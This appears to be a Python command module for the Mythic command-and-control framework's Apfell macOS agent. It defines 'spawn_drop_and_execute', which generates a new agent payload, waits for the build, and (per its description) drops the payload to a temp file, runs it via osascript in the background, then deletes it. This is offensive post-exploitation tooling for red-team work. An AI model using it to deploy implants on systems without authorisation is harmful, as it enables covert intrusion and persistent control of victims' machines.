from mythic_container.MythicCommandBase import *
import sys
from mythic_container.MythicRPC import *
import asyncio


class SpawnDropAndExecuteArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="template",
                type=ParameterType.Payload,
                description="apfell agent to use as template to generate a new payload",
                supported_agents=["apfell"],
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply arguments")
        raise ValueError("Must use the modal")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class SpawnDropAndExecuteCommand(CommandBase):
    cmd = "spawn_drop_and_execute"
    needs_admin = False
    help_cmd = "spawn_drop_and_execute"
    description = "Generate a new payload, drop it to a temp location, execute it with osascript as a background process, and then delete the file. Automatically reports back the temp file it created"
    version = 1
    author = "@its_a_feature_"
    attackmapping = ["T1059.002", "T1553.001"]
    argument_class = SpawnDropAndExecuteArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        try:
            gen_resp = await MythicRPC().execute("create_payload_from_uuid", task_id=task.id,
                                                 payload_uuid=task.args.get_arg("template"))
            if gen_resp.status == MythicStatus.Success:
                # we know a payload is building, now we want it
                while True:
                    resp = await MythicRPC().execute("get_payload", payload_uuid=gen_resp.response["uuid"])
                    if resp.status == MythicStatus.Success:
                        if resp.response["build_phase"] == "success":
                            task.args.add_arg("template", resp.response["file"]["agent_file_id"])
                            task.display_params = f"new Apfell payload ({resp.response['uuid']}) with description {resp.response['tag']}"
                            break
                        elif resp.response["build_phase"] == "error":
                            raise Exception(
                                "Failed to build new payload: " + str(resp.error)
                            )
                        else:
                            await asyncio.sleep(1)
                    if resp.status == MythicStatus.Error:
                        raise Exception("Failed to get information about new payload:\n" + resp.error)
            else:
                raise Exception("Failed to generate new payload:\n" + gen_resp.error)
        except Exception as e:
            raise Exception("Error trying to call RPC:\n" + str(e))
        return task

    async def process_response(self, response: AgentResponse):
        pass
